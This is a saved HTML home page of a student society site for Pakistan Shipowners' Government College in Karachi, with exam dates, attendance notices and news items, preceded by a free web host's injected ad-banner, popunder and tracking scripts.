<SCRIPT LANGUAGE=JavaScript>
<!--
   document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%66%75%6E%63%74%69%6F%6E%20%44%65%63%6F%64%65%28%73%29%7B%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E'));
//-->
</SCRIPT>
<SCRIPT LANGUAGE=JavaScript src="/fs_img/js/md5.js"></SCRIPT>
<!-- '"AWS"' -->
<!-- Auto Banner Insertion Begin -->
<div id=aws_9884 align=center><style type="text/css">
  .mwsb{ background-color: 3366CC; border-width: 1px; border-color: 3366CC; border-style: solid; }
  .mwst, .mwst a{ font-family: arial,sans-serif; font-size: 8pt; background-color: white; color: blue;}
  </style>
  <!------ OAS SETUP begin ------>
  <img src="http://track.untd.com/s/oasrdb?pid=MWS&profile=,," width="1" height="1">
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = "http://cyclops.prod.untd.com/";
  //OAS_sitepage values can be found in the excel spreadsheet showing position and pagenames.
  OAS_sitepage = 'webservices/general'; //CHANGED
  //OAS_sitepage = window.location.hostname + window.location.pathname;
  // must list every Ad position on the page or they will not show.  Also you can't have line items that are not on the page or a impression will be counted even though it was actually shown. 
  OAS_listpos = 'Top,Bottom,Frame1,Frame2,Right,TopLeft,Top1,TopRight';
  OAS_query = '';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>


  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCR'+'IPT>');//-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }

  //-->
  </SCRIPT>
  <!-- start /fs_img/about_pop.txt -->
<!-- The only pops this script can generate now are:
			1. Pops from UOL
			2. In-house popup
-->
<script language="JavaScript">
<!--
var isUS = "0";
var keyword = escape("");
var compname='freeservers';
var ourExitPop=true;

function popSlot(slot){
    // OAS AD 'Frame1' begin
    if(window.OAS_AD) OAS_AD('Frame1');
    // OAS AD 'Frame1' begin
}

function checkPopunderCookie() {
	var cookieVal = 0;
	cookieExpDays = (1/24);  
	var expDate = new Date();
	expDate.setTime(expDate.getTime() + (86400000 * cookieExpDays));
	cookieDate = ";Expires=" + expDate.toGMTString();
	if (document.cookie) {
		var cookieInfo = document.cookie.split(";");
		for (i=0; i<cookieInfo.length; i++) {
			cName = cookieInfo[i].split("=")[0];
			if (cName.indexOf("pixelpop") >= 0) {
				cookieVal = cookieInfo[i].split("=")[1];
			}
		}
	}
	cookieVal++;
	document.cookie="pixelpopslot="+cookieVal+";path=/;"+cookieDate;
 	if (cookieVal== 1) { popSlot(1); }
 	if (cookieVal== 2) { popSlot(2); }
 	if (cookieVal== 3) { popSlot(3); }
 	if (cookieVal== 4) { popSlot(4); }
 	if (cookieVal== 5) { popSlot(5); }
 	if (cookieVal== 6) { popSlot(6); }
 	if (cookieVal== 7) { popSlot(7); }
 	if (cookieVal== 8) { popSlot(8); }
}

if (!window.sprs) checkPopunderCookie();

if (!window.sprs && ourExitPop && (navigator.appName.indexOf('etscape')==-1)){
	window.onunload=staycheck;
	StayingOnSite=false;
	DadLinkURLs="";
	BabyLink="";
	DadWindow=window.parent;
	DadLinks=DadWindow.document.links;
	DadHost="http://"+location.hostname;
	DadWindow.document.onclick=linktellerDad;
	document.onclick=linktellerThis;
	function linkteller(){
		while (EventTag.parentElement&&(EventTag.tagName!="A")){
				EventTag=EventTag.parentElement;
		}
		if ((EventTag.tagName=="A")&&(!EventTag.target)){
			if (EventTag.href.indexOf(DadHost)>-1){
				StayingOnSite=true;
			} else {
				StayingOnSite=false;
			}
		}
	}
	function linktellerThis(){
		EventTag=window.event.srcElement;
		linkteller();
	}
	function linktellerDad(){
		EventTag=DadWindow.event.srcElement;
		linkteller();
	}
	function staycheck(){
		if (StayingOnSite){
		} else {
		}
	}
}
-->
</SCRIPT>
<!-- end /fs_img/about_pop.txt -->
  <table cellpadding="0" cellspacing="0" width="980">

    <!-- start: related resources -->
    <tr>
      <td colspan="3">
        <table cellpadding="0" cellspacing="0" align="center" width="100%" class="mwsb">
          <tr>
            <td class="mwst" id="uows0207" align="center">
              <a href="http://www.freeservers.com" target="_top">Free Web Hosting Provider</a> 
              - <a href="http://www.globalservers.com" target="_top">Web Hosting</a>
              - <a href="http://www.bizhosting.com" target="_top">E-commerce</a>
              - <a href="http://www.netzero.com/?refcd=MWS0404NWP11" target="_top">High Speed Internet</a>
              - <a href="http://www.freeservers.com/Free-Web-Page.html" target="_top">Free Web Page</a>
              <script type="text/javascript"><!--
              function find(){ obj = document.getElementById('uows0207'); arr = obj.getElementsByTagName('a'); for(var i=0;i<arr.length;i++){ var x = '?refcd=WSUOWS020722NB01'; if(!arr[i].href.match(/refcd/)) arr[i].href+=x; }}; find();
              //--></script>
            </td>
          </tr>
        </table>
      </td>
    </tr>
    <!-- end: related resources -->

    <tr>
      <td width="130">
        <table cellpadding="0" cellspacing="0" width="130" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <a href="http://8k.com/?refcd=MWS_20040713_Banner_bar"
                ><img src="/cgi-bin/image/images/bannertype/100X22.gif" width="100" height="22" border="0"
                ></a
              ><a href="/cgi-bin/login" target="_blank"
                ><img src="/cgi-bin/image/images/bannertype/login_chunkx.gif" width="30" height="22" border="0"
                ></a
             ></td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <a href="/cgi-bin/path/signup?refcd=MWS_20040713_Banner_bar"
              ><img src="http://nztv.prod.untd.com/RealMedia/ads/Creatives/ISP/MWS_Mkting_LSKYBUT_34_8023/128x64_get_a_free_website_01.gif" border="0"
              ></a>
            </td>
          </tr>
        </table>
      </td>

      <td>
        <table cellspacing="0" class="mwsb" style="margin:2px;margin-bottom:0px;table-layout:fixed;"> 
          <tr>
            <td class="mwst" align="center" style="width:730px;">
    <!------ OAS AD 'Top' begin ------>
    <SCRIPT LANGUAGE=JavaScript>
    <!--
    if(window.OAS_AD) OAS_AD('Top');
    //-->
    </SCRIPT>
    <!------ OAS AD 'Top' end ------></td>
          </tr>
        </table>
      </td>

      <td width="120">
        <table class="mwsb" cellpadding="0" cellspacing="0" width="120" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('Top1');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('TopRight');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
      </td>

    </tr>
    <tr>
      <td colspan="3" align="center">
        <!-- search bar begins --><table width="100%" cellpadding="0" cellspacing="0" class="mwsb" style="border-width:2px; margin-top:10px; background-color:white; height:10px;">  <tr valign="top">    <td align="center">      <form action="http://search.mysite.com/search" style="margin:0;" target="_blank">      <span style="position:relative;top:-5px;font-family:arial;font-size:12px;color:#000;"><b>Search the Web</b></span>      <input type="hidden" name="source" value="mws_endsite_box">      <input type="hidden" name="action" value="search">      <input name="query" accesskey="s" style="width:400px; height:21px; background:white; border:1px #A4ABB1 solid; font-family: arial, sans-serif; font-size: 10pt; color: #000000; position:relative; top:-6px;">      <input type="image" src="/fs_img/bannertype/infospace/search_sp_go.gif">      <img src="/fs_img/bannertype/infospace/search_logo.gif" style="position:relative;top:4px;left:10px;">      </form>    </td>    <td width="5%"></td>  </tr></table>
      </td>
    </tr>
  </table><DIV id=sideFrame 
	style="MARGIN-TOP: 27px; RIGHT: 5px; WIDTH: 120px; COLOR: #ffffff; POSITION: absolute; BACKGROUND-COLOR: #CCCCCC; Z-INDEX: 10000; TEXT-ALIGN: right"><A 
	href="javascript:void%20(sideFrameOff())"><IMG src="/fs_img/banners/xout.gif" title="Close"
	border=0></A><BR>
  <!------ OAS AD 'Right' begin ------>
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  OAS_AD('Right');
  // -->
  </SCRIPT>
  <!------ OAS AD 'Right' end ------>
	<SCRIPT>
		origRightPadding=document.body.style.paddingRight;
		document.body.style.paddingRight="130px";
		function sideFrameOff(){
			document.getElementById('sideFrame').style.display='none';
			document.body.style.paddingRight=origRightPadding;
		}
	</SCRIPT>
	</DIV>
  <DIV id="setMyHomeOverlay" align="left" style="position:absolute; top:25%; left:25%; width:358px; border:1px solid #AEAEAE; background-color:white; z-index:200000; display: none;">
    <div style="height:59px; padding-left:22px; background:white url('/cgi-bin/image/images/sethome_top_border.gif') repeat-x;">
    <div style="float:left; width:182px; height:35px; margin-top:12px; font:bold 38px arial,sans-serif; color:#454545"> Welcome! </div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right; font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div>
    <div style="height:170px; background:#ffffff;">
    <div style="padding:30px 20px 0px 20px; font:normal 14px arial; height:80px;"> Would you like to make this site your homepage? It's fast and easy... </div>
    <div style="padding:10px 0 0 41px;">
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_l.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_m.gif') repeat-x; width:265px; height:26px; text-align:center; font:bold 13px Arial; color:#FFFFFF; line-height:25px;" onclick="javascript:do_set_homepage('do');"> Yes, Please make this my home page! </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_r.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div></div>
    <div style="padding-left:148px; padding-top:7px; clear:both; font:normal 12px arial;"><a href="#" style="text-decoration:none; color:#004182;" onclick="javascript:do_set_homepage('close'); return false;">No Thanks</a></div></div>
    <div style="height:36px; background: white url('/cgi-bin/image/images/sethome_bot_border.gif') repeat-x;">
    <div style="float:left;margin:12px 0px 0px 20px; line-height:10px;"><input type="checkbox" style="width:11px; height:11px;" onclick="javascript:do_set_homepage('dont');"></div>
    <div style="float:left;font:normal 12px arial;padding:10px 0 0 2px;"> &nbsp; Don't show this to me again.</div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right;font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div></div>
    <span ID="mws_oHomePageOverlay" style="behavior:url(#default#homepage); display:none;"></span>
    <script src=/fs_img/js/overlay.js></script><script defer="defer" src=/fs_img/js/set_homepage.js></script></div><!-- Auto Banner Insertion Complete THANK YOU -->

<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('%286Fvfulsw%2853odqjxdjh%286G%2855mdydvfulsw%2855%2853w%7Csh%286G%2855wh%7Bw2mdydvfulsw%2855%2853vuf%286G%28552fjl0elq2ydolgdwhbedqqhu%286Ihqf%286Gwyl4wylf%28586D8%28586E%28586D4wvz%7Bf%28586F%3C%28586E%28586D7%2855%286H%286F2vfulsw%286H3');
//-->
</SCRIPT>
<HTML><HEAD>
            <STYLE>.headingsmall {
	FONT-SIZE: 12px; FONT-FAMILY: Arial
}
            a:link.spider {
	COLOR: gray; TEXT-DECORATION: none
}
            </STYLE>

            <TITLE>Pakistan Shipowners' Government College</TITLE>
<META http-equiv=Content-Type content="text/html; charset=windows-1256">
<META content=" Shipowners.8k.com is the biggest Education-based portal on the net that offers a wealth of information on the College and bring the largest part of the World Wide web to the community and satisfy their demand to understand the internet  " 
name=keywords South Asian, South Asia, Pakistan, Pakistani, Afghanistan, Afghan, Afghani, India, Indian, shop, shopping, gifts, recipes, sports, news, cricket, travel, Games,? Weather, Woman, News, Quran, an,>
<META 
content="Shipowners.8k.com is the biggest Education-based portal on the net that offers a wealth of information on the College and bring the largest part of the World Wide web to the community and satisfy their demand to understand the internet." 
name=description>
<META content=" Shipowners College" name=title>
<STYLE>Shipownersbody {
	FONT-WEIGHT: bold; FONT-SIZE: 12.5pt; FONT-FAMILY: arial
}
.Body_con {
	FONT-SIZE: 10pt; FONT-FAMILY: arial
}
SPAN.items_sec {
	FONT-WEIGHT: bold; FONT-SIZE: 10pt; COLOR: #2b62a6; TEXT-INDENT: 5px; FONT-FAMILY: arial
}
.sub_items_sec {
	FONT-SIZE: 8pt; COLOR: #2b62a6; TEXT-INDENT: 2px; FONT-FAMILY: arial; HEIGHT: 10pt
}
            </STYLE>

<BODY class=Shipownersbody><!--Top Section include logo,banners and navigation bar -->
<TABLE cellSpacing=0 cellPadding=0 width=752 align=center border=0 height="49">
  <TBODY>
  <TR>
    <TD width=328 height="23">
     <img border="0" src="1.jpg" width="71" height="88"><img border="0" src="LOGO.gif" width="183" height="83"></TD>
    <TD width=215 height="23">
    <img border="0" src="ani-gif.gif" width="175" height="53"></TD>
    <TD width=305 height="23">
      
    <embed width="270" height="68" src="main.swf"></TD>
    </TR>
  <TR>
    <TD colSpan=2 height=1 width="235" style="border-bottom-style: solid; border-bottom-width: 1"></TD></TR>
  <TR>
    <TD colSpan=3 width="530" bordercolor="#808080" height="27" bgcolor="#2B62A6" style="border-style: solid; border-width: 1">
      <font face="Verdana">
      <font color="#0000FF">
      <b><font size="1">
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/index.htm"><font color="#FFFFFF">
    HOME</font></a></font></b></font><font size="1"><b><font color="#FFFFFF"><SPAN class=nav>  
    |  </SPAN>
      </font>
      <font color="#0000FF">
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/about.htm"><font color="#FFFFFF">
    ABOUT</font></a></font><font color="#FFFFFF"> 
      </font></b></font><b><font size="1" color="#FFFFFF"><SPAN 
      class=nav>|
      <a href="http://www.shipowners.8k.com/prospectus.htm" style="text-decoration: none">
      <font color="#FFFFFF">PROSPECTUS</font></a> |  </SPAN>
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/depart.htm">
      <font color="#FFFFFF">DEPARTMENTS</font></a><SPAN 
      class=nav>  |  
      <a href="http://www.shipowners.8k.com/notes.htm" style="text-decoration: none">
      <font color="#FFFFFF">NOTES</font></a>  |  </SPAN>
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/mag.htm">
      <font color="#FFFFFF">COLLEGE MAG</font></a> </font>
      <SPAN 
      class=nav><font size="1"><font color="#FFFFFF"> | 
    <span style="background-color: #2B62A6">
      <a href="http://www.shipowners.8k.com/map.htm" style="text-decoration: none">
      <font color="#FFFFFF">MAP</font></a></span>  | 
      </font>
      <a style="text-decoration: none" href="http://www.shipowners.8k.com/contact.htm">
      <font color="#FFFFFF">CONTACT</font></a></font></SPAN></b></font><b><SPAN class=nav><font size="1" color="#FFFFFF"> </font>
      </SPAN></b><a href="contact.asp">
      </font></a></font>
    </TD>
    </TR></TBODY></TABLE><!--End Top Section include logo,banners and navigation bar --><!--Middle  Section -->
<TABLE cellSpacing=0 cellPadding=0 width=1 align=center border=0 height="331">
  <TBODY>
  <!--Middle  Section  -->
  <TR><!--left  Section  -->
    <TD vAlign=top align=middle width=436 height="200" bordercolor="#000000">
      <TABLE 
      style="BORDER-RIGHT: #c9c9c9 1px solid; BORDER-TOP: #c9c9c9 1px solid; BORDER-LEFT: #c9c9c9 1px solid; WIDTH: 436px; BORDER-BOTTOM: #c9c9c9 1px solid; BACKGROUND-COLOR: #f4f2fd" 
      height=20 border=0>
        <FORM id=form1 name=form1 
        action=http://edalilc.ajeeb.com/categories.asp><INPUT type=hidden 
        name=IGO_CAM><INPUT type=hidden name=adv><INPUT type=hidden 
        value=Allwords name=IGO_TYPE>
        <TBODY>
        <TR>
          <TD>
              <script>
function doSubmit(frm) {
if(frm.se.selectedIndex<1) 
alert("Select a search engine");
else
window.open(frm.se.options[frm.se.selectedIndex].value+frm.word.value);

}
              </script>
              <p align="left" style="margin-top: 0; margin-bottom: 0">
          <IMG src="../../My%20Documents/My%20Webs/search-for-web.gif" width="97" height="16"><font face="Arial"><b><font color="#000080"><input name=word class="stext" size="27"></font><font color="#000080"><select name=se class="drpdwn" style="font-family: Arial">
                <option value="">Select 
                <option value=http://search.yahoo.com/bin/search?p=>Yahoo 
                <option value=http://www.altavista.com/sites/search/web?pg=q&kl=XX&q=>
                Altavista 
                <option value=http://www.ask.com/main/askjeeves.asp?ask=>ASK 
                <option value=http://www.google.com/search?q=>Google 
                <option value=http://search.msn.com/results.asp?RS=CHECKED&FORM=MSNH&v=1&q=>
                MSN 
                <option value=http://search.lycos.com/main/?rd=y&query=>Lycos 
                <option value=http://search.excite.com/search.gw?c=web&lk=webcrawler&onload=&s=>
                WebCrawler 
                <option value=http://hotbot.lycos.com/?SM=MC&DV=0&LG=any&DC=10&DE=2&AM1=MC&MT=>
                HotBot 
                <option value=http://www.goto.com/d/search/p/go/?Partner=go_home&Go=Search&Keywords=>
                Go 
              </select></font><font size="2" color="#000080"><INPUT 
                                border=0 
                                src="search.gif" 
                                type=image width="45" height="18"></font> </b></font></p>
          </TD>
          </TR></TBODY></TABLE>
      <TABLE cellSpacing=0 cellPadding=0 width=436 border=1 bordercolorlight="#FFFFFF" bordercolor="#FFFFFF" style="border-collapse: collapse"></FORM>
        <FORM name=tarjim_T action=default.asp method=post>
        <TBODY>
        </FORM>
        <TBODY>
        <TR>
          <TD align=top width="443">
                <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="462">
                  <tr>
                    <td width="75" align="justify"><b><SPAN class=sub_items_sec>
                    <font face="Tahoma" color="#008000" size="2">
                    <img border="0" src="COM07.JPG" width="71" height="63"></font></SPAN></b></td>
                    <td width="385" align="justify">
                    <table cellSpacing="0" cellPadding="0" width="100%" background="s1_center_bk.jpg" border="0">
                      <tr>
                        <td width="8%"><b>
                        <font face="Verdana" color="#000000" size="4">
                        <img src="s1_center_left.jpg" border="0" width="30" height="30"></font></b></td>
                        <td width="92%">
                    <p style="margin-top: 0; margin-bottom: 0"><b><SPAN class=sub_items_sec>
                    <font face="Arial" size="5" color="#000080">Students' 
                    Educational Society</font></SPAN></b></p>
                        </td>
                      </tr>
                    </table>
                    <p style="margin-top: 0; margin-bottom: 0">
                    <font size="2" face="Arial">The Students Educational Society
                    </font><span style="font-family: Arial"><font size="2">has 
                    been playing a very substantial part in developing 
                    consciousness among people about the significance of 
                    educational environment in a college. The Society Under the 
                    Patron.............                
                    </font></span><b>
                <font color="#0000FF" style="font-size: 11pt">
                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;
                    <a href="http://www.shipowners.8k.com/society.htm">More....</a></font></b></td>
                  </tr>
                  </table>
      <TABLE 
      style="BORDER-RIGHT: #8e8ea6 1px solid; BORDER-LEFT: #8e8ea6 1px solid; BORDER-BOTTOM: #8e8ea6 1px solid" 
      cellSpacing=0 cellPadding=0 width=465 bgColor=#f6f6f6 border=0 height="5">
        <TR>
          <TD width=458 height="5" bgcolor="#2B62A6">
            <font face="Tempus Sans ITC" style="font-weight: 700" color="#FFFFFF" size="4">
            FANTASTIC </font><b>
            <font color="#FFFFFF" face="Arial Narrow" size="2">(Enjoy Reading 
            Interviews of our college Professors)</font></b><font face="Tempus Sans ITC" style="font-weight: 700" color="#FFFFFF" size="4">
            </font></TD>
          </TR></TABLE>
      <TABLE cellSpacing=0 cellPadding=0 width=462 border=0 height="29">
        <TBODY>
        <tr>
          <TD width=150 bgcolor="#FFFFFF" style="border-left-style: solid; border-left-width: 1; border-top-style: solid; border-top-width: 1; border-bottom-style: solid; border-bottom-width: 1">
            &nbsp;</TD>
          <TD vAlign=top width="310" bgcolor="#DEB4B4" style="border-right-style: solid; border-right-width: 1; border-top-style: solid; border-top-width: 1; border-bottom-style: solid; border-bottom-width: 1">
            <p align="justify"><font size="2" face="Arial">
            <a href="http://www.shipowners.8k.com/interviews.htm" style="text-decoration: none">
            <font color="#000000">Students Educational Society Team has 
            collected the interviews of the famous personalities of Karachi We 
            are grateful to all of them for supporting us at every aspect.</font></a></font></TD>
        </tr>
        </TBODY></TABLE>
                <p style="margin-top: 0; margin-bottom: 0">
                <IMG height=20 src="news_e.gif" 
            width=463></p>
                </TD></TR></TD></TR></TBODY></TABLE>
      <TABLE 
      style="BORDER-RIGHT: #8e8ea6 1px solid; BORDER-LEFT: #8e8ea6 1px solid; BORDER-BOTTOM: #8e8ea6 1px solid" 
      cellSpacing=0 cellPadding=0 width=463 bgColor=#f6f6f6 border=0 height="105">
        <TBODY>
        <TR>
          <TD width=150 height="105" bgcolor="#FFFFFF">
            <CENTER><img border="0" src="geo.jpg" width="124" height="84"></CENTER></TD>
          <TD vAlign=top width="306" bgcolor="#F6F6F6" height="105">
            <TABLE height="100%" cellSpacing=0 cellPadding=0 width="305">
              <TBODY>
              <TR>
                <TD width="12" bgcolor="#F6F6F6"><B>
                <FONT face="Geneva, Arial, Helvetica" color=#FF0000 
                  size=-1>»</FONT></B></TD>
                <TD width=1 bgcolor="#F6F6F6"></TD>
                <TD width="293" bgcolor="#F6F6F6">
                <font face="Arial" size="2" color="#000080">
                <a href="http://www.shipowners.8k.com/datesheet.htm" style="text-decoration: none">
                <font color="#000080">The Students Educational Society has collected the date sheet. 
                Examinations of HSC will be continuing from 24th April 2003.</font></a></font></TD></TR>
              <TR>
                <TD width="12" bgcolor="#F6F6F6"><B>
                <FONT face="Geneva, Arial, Helvetica" color=#FF0000 
                  size=-1>»</FONT></B></TD>
                <TD width=1 bgcolor="#F6F6F6"></TD>
                <TD width="293" bgcolor="#F6F6F6">
                <a href="http://www.shipowners.8k.com/attendance.htm" style="text-decoration: none">
                <font face="Arial" size="2" color="#000080">
                The Students Educational Society has launched your total 
                attendance percentage.</font></a></TD></TR>
              <TR>
                <TD width="12" bgcolor="#F6F6F6"><B>
                <FONT face="Geneva, Arial, Helvetica" color=#FF0000 
                  size=-1>»</FONT></B></TD>
                <TD width=1 bgcolor="#F6F6F6"></TD>
                <TD width="293" bgcolor="#F6F6F6">
                <font face="Arial" size="2" color="#000080">Timings for HSC 
                Examinations for Pre-Engineering are 03:00 - 06:00 p.m. and for 
                Commerce 10:00 a.m. - 01:00 p.m.</font></TD></TR>
              <TR>
                <TD width="12" bgcolor="#F6F6F6"><B>
                <FONT face="Geneva, Arial, Helvetica" color=#FF0000 
                  size=-1>»</FONT></B></TD>
                <TD width=1 bgcolor="#F6F6F6"></TD>
                <TD width="293" bgcolor="#F6F6F6">
                <font face="Arial" size="2" color="#000080">
                 The Students Educational Society is arranging visit to SUPARCO. 
                 You are requested to register yourself for this Educational 
                 Trip.</font></TD></TR>
              <TR>
                <TD align=right colSpan=3 width="301" bgcolor="#F6F6F6">
                <p style="margin-top: 0; margin-bottom: 0"><b>
                <a href="http://www.shipowners.8k.com/news.htm">
                <font color="#0000FF" style="font-size: 11pt">More 
            News...</font></a></b></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
      <font face="verdana,geneva,ms sans serif" color="#6c6c6c" size="1">
      <table width="459" border="0" height="47">
        <tr>
          <td vAlign="top" align="left" width="28" height="43">
          <p style="margin-top: 0; margin-bottom: 0">
          <img alt="Credit: Getty Images" src="weights.jpg" border="0" width="50" height="50"></td>
          <td width="421" height="43">
          <p style="margin-top: 0; margin-bottom: 0">
          <font face="arial,helvetica,sans serif" color="#6c6c6c" size="3"><b>
          &nbsp;</b></font><font face="verdana,geneva,ms sans serif" color="#6c6c6c"><b>ShipOwner's 
          Health Maniac</b></p>
      </font>
          <p style="margin-top: 0; margin-bottom: 0">
          <font face="arial,helvetica,sans serif" color="#6c6c6c" size="3"><b>
          &nbsp;<a href="http://www.shipowners.8k.com/fitnesstip.html">Bodybuilding: Heavy vs. Light Workouts</a></b><br>
          </font>
          <font face="verdana,geneva,ms sans serif" color="#6c6c6c" size="1">
          &nbsp;
          Most of us have light workout days after training really hard, but 
          does  </font></p>
          <p style="margin-top: 0; margin-bottom: 0">
          <font size="1" color="#6C6C6C">&nbsp; </font>
          <font face="verdana,geneva,ms sans serif" color="#6c6c6c" size="1">
          lifting light weights keep muscles intact? Find out.
          <a href="http://www.shipowners.8k.com/fitnesstip.html">More</a></font></td>
        </tr>
      </table>
      </font>
      </TD><!--End left  Section  -->
    <TD width=8 height="200">
    <p></TD><!--Right  Section  -->
    <TD vAlign=top width=316 height="200">
      <!-- blue credits bar --><!-- serial # 041801-1 --></pre>
      </p>
      <p><a href="http://www.bluesky.8k.com/">
          <img border="0" src="bluesky.jpg" width="141" height="105"></a><A 
                              href="http://www.wunderground.com/global/stations/41780.html" 
                              target=_blank><IMG height=108 
                              alt="Click for Karachi, Pakistan Forecast" 
                              src="http://banners.wunderground.com/banner/infoboxtr_both/language/www/global/stations/41780.gif" width=144 
                              border=0></A></p><TABLE class=body_con 
      style="BORDER-RIGHT: 2px solid #2B62A6; BORDER-LEFT: 2px solid #2B62A6; ; border-collapse:collapse; border-top-color:#2B62A6; border-top-width:2; border-bottom-color:#2B62A6; border-bottom-width:2" 
      cellSpacing=0 cellPadding=0 width=237 border=0 bordercolor="#111111" height="54"><TBODY>
        </TD></TR>
        <TR>
          <TD width="230" bordercolorlight="#003399" height="5"><TABLE 
            style="BORDER-RIGHT: 1px solid #000000; BORDER-LEFT: 1px solid #000000; ; border-collapse:collapse; border-top-color:#000000; border-top-width:1; border-bottom-color:#000000; border-bottom-width:1" 
            cellSpacing=0 cellPadding=0 width=264 bgColor=#f6f6f6 border=0 height="1" bordercolor="#111111"><TBODY>
              <tr>
                <TD vAlign=top width="122" height="1" bgcolor="#FFFFFF"><p style="margin-top: 0; margin-bottom: 0">
                 </p>
                <p style="margin-top: 0; margin-bottom: 0">
           </p>
                <p style="margin-top: 0; margin-bottom: 0">
           </p>
                <p> </TD>
                <TD vAlign=top height="1" width="138" bgcolor="#FFFFFF"></TD>
              </tr>
              <tr><TD height="15" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="122" bgcolor="#2B62A6"><span class="items_sec"><u><font color="#FFFFFF">Date Sheet</font></u></span></TD>
                <TD height="15" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="138" bgcolor="#2B62A6"><span class="items_sec"><u><font color="#FFFFFF">Attendance</font></u></span></TD></tr><tr><TD vAlign=top width="122" height="1" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" bgcolor="#89B5F5"><font size="1" face="Arial"><a href="http://www.shipowners.8k.com/datesheet.htm" style="text-decoration: none; font-weight:700"><font color="#000000">Examinations Date Sheet Available Now at Shipowner's Website</font></a></font></TD>
                <TD vAlign=top height="16" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="138" bgcolor="#89B5F5"><b><font face="Arial" size="1"><a href="http://www.shipowners.8k.com/attendance.htm" style="text-decoration: none"><font color="#000000">Attendance Record uptil March is Available </font></a></font></b></TD>
              </tr><tr><TD height="15" style="border-style: ridge; border-width: 2" bordercolor="#C0C0C0" width="122" bgcolor="#2B62A6"><u>
                <span class="items_sec"><font color="#FFFFFF">Fun</font></span></u></TD>
